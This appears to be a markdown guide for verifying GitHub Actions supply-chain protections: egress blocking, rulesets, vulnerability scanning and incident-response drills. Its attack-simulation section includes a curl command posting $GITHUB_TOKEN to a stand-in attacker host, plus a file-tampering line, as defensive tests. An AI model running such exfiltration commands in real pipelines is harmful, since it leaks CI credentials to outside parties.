# 30 – Verification & Testing

## A. Test Harden-Runner Protection

### Create Test Repository
1. Create a new repository or use existing one
2. Add the supply chain security workflow
3. Create a test branch and pull request

### Verify Egress Blocking
Check the workflow logs for:
```
🔒 Testing egress blocking...
Testing blocked endpoint (1.1.1.1)...
✅ Egress blocking verified: 1.1.1.1 properly blocked
```

If you see:
```
❌ SECURITY RISK: Egress not properly blocked!
```
This indicates network controls need adjustment.

### Check StepSecurity Dashboard
1. Visit https://app.stepsecurity.io/
2. Find your repository and workflow run
3. Review "Network" tab for detected connections
4. Check "Recommendations" for security insights

## B. Repository Ruleset Verification

### Test Status Check Enforcement
1. Create PR without security workflow
2. Verify merge is blocked with message: "Required status check 'Supply Chain Security Enforcement' is expected"
3. Add security workflow to PR
4. Verify checks pass and merge is allowed

### Test Rule Inheritance
For enterprise setups:
1. Create new repository in organization
2. Verify enterprise rulesets automatically apply
3. Check that security requirements are inherited
4. Test bypass controls (if configured)

## C. Vulnerability Detection Testing

### Trivy Scanner Verification
Add a test file with known vulnerabilities:
```javascript
// package.json - add vulnerable dependency
"dependencies": {
  "lodash": "4.17.15"  // Known vulnerable version
}
```

Expected result: Workflow fails with HIGH/CRITICAL vulnerability detected

### Dependency Confusion Testing
For Node.js projects, test the package hygiene:
```bash
# This should be caught by the workflow
npm install @malicious/package --dry-run
```

## D. Multi-Organization Testing

### Enterprise Ruleset Validation
1. **Test across organizations**: Verify rulesets apply to all orgs
2. **Exception testing**: Confirm excluded repositories are not affected
3. **Property-based rules**: Test conditional enforcement based on repository properties

### Template Repository Testing
1. Create new repository from template
2. Verify security workflows are included
3. Test workflow execution and compliance

## E. Attack Simulation

### Simulated Exfiltration Attempt
Create a test workflow with intentional violations:
```yaml
# ⚠️ This should be blocked by Harden-Runner
- name: Simulated Attack
  run: |
    echo "Attempting to exfiltrate data..."
    curl -X POST https://evil.example.com/exfil -d "token=$GITHUB_TOKEN" || echo "Blocked by Harden-Runner ✅"
```

Expected: Harden-Runner blocks the connection and alerts

### File Tampering Detection
```yaml
- name: Simulated Tampering
  run: |
    echo "Attempting file modification..."
    echo "malicious code" >> src/main.js
    # This should be detected by file integrity monitoring
```

## F. Performance Impact Testing

### Workflow Duration Comparison
Measure impact of security controls:
- **Baseline**: Workflow without Harden-Runner
- **With security**: Workflow with full security stack
- **Acceptable overhead**: < 30 seconds additional runtime

### Resource Usage
Monitor runner resource consumption:
- **CPU**: Security monitoring overhead
- **Memory**: Harden-Runner agent usage
- **Network**: Allowlist verification

## G. Incident Response Testing

### Security Alert Response
1. Trigger security alert (blocked connection)
2. Verify alert reaches security team
3. Test incident response procedures
4. Document response times and effectiveness

### False Positive Handling
1. Identify legitimate connections blocked by allowlist
2. Test allowlist update process
3. Verify updated rules take effect
4. Measure time to resolution

## H. Compliance Verification

### Audit Trail Review
- **Workflow logs**: Security check execution
- **StepSecurity dashboard**: Detailed security events
- **GitHub audit log**: Ruleset configuration changes
- **Repository activity**: Security-related commits

### Documentation Verification
Ensure all security controls are:
- **Documented**: Clear setup and operation procedures
- **Versioned**: Configuration stored in version control
- **Tested**: Regular verification of effectiveness
- **Monitored**: Continuous security monitoring active